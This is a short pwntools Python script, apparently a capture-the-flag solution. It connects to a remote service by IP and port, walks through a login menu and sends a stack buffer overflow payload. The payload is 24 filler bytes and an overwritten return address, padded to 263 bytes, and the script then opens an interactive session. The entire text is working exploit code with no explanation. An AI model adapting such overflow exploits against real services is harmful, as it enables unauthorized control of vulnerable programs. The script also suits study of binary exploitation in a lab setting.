from pwn import *
context.log_level = 'debug'

p="./elf"

context.binary=p
#io=process(p)
io=remote("111.198.29.45",33186)

payload='a'*24+p32(0x0804868B)
io.recvuntil("choice:")
io.sendline('1')
io.recvuntil('username:')
io.sendline('a')
io.recvuntil('passwd:')
io.sendline(payload.ljust(263,'a'))

io.interactive()
